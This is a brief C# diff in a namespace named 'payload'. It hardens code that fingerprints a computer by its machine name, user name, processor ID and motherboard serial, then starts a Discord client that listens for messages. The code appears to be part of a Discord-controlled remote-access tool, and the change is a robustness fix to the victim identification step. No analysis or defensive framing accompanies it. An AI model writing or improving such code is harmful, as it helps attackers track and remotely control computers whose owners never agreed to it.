@@ -56,7 +56,11 @@ namespace payload
             Threads tds = new Threads();
             tds.Start();
 
-            machineid = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{Environment.MachineName.Substring(0, 4)}{Environment.UserName.Substring(0, 4)}{Environment.ProcessorCount}_{Utils.GetProcessorId().Substring(0, 5)}{Utils.GetMotherboardSerialNum().Substring(0, 5)}"));
+            string processorID = Utils.GetProcessorId();
+            string motherboardSerialNum = Utils.GetMotherboardSerialNum();
+            try { processorID = processorID.Substring(0, 5); } catch { }
+            try { motherboardSerialNum = motherboardSerialNum.Substring(0, 5); } catch { }
+            machineid = Convert.ToBase64String(Encoding.UTF8.GetBytes($"{Environment.MachineName.Substring(0, 4)}{Environment.UserName.Substring(0, 4)}{Environment.ProcessorCount}_{processorID}{motherboardSerialNum}"));
 
             client = new DiscordSocketClient();
             client.MessageReceived += MessageReceived;
